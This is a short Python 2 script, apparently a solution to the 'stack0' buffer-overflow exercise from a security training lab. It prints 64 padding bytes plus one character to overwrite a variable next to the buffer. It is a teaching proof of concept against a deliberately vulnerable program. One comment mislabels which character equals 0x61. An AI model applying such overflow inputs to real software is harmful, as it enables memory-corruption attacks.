#!/usr/bin/python


#NOTE
#Usage:
#./exploit.py | ./stack0



PAD = "A" * 64 	
#Fill up the varibale buffer with A char.
NEW_VALUE = "a"
#A will be convert to ascii then to hex and its equal 0x61 : 97 

exploit = PAD + NEW_VALUE

print exploit
